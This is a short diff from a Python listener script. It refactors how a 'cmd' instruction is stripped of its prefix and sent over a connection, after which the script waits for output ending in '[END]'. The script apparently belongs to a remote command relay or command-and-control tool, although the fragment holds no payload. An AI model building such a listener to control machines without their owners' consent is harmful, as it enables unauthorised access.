@@ -386,7 +386,8 @@ def listen():
                         cmd = ""
                 elif cmd.split()[0] == "cmd":
                     data = ""
-                    send_data(conn, cmd.replace("cmd ",""))
+                    new_cmd = cmd.replace("cmd ","")
+                    send_data(conn, new_cmd)
                     if VERBOSE:
                         print_info("Waiting for data...")
                     while not data.endswith('[END]'):
